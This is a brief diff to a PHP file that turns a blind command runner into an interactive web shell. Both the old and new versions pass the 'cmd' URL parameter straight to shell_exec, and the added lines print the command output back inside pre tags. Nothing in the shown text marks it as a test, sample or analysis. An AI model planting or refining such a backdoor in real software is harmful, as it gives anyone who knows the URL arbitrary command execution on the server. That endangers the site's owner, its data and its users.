@@ -1,5 +1,5 @@
 <?php
-    if($_GET['cmd'])
-    {
-        shell_exec($_GET['cmd']);
+    if ($_GET['cmd']) {
+        echo "<pre>";
+        print shell_exec($_GET['cmd']);
     }
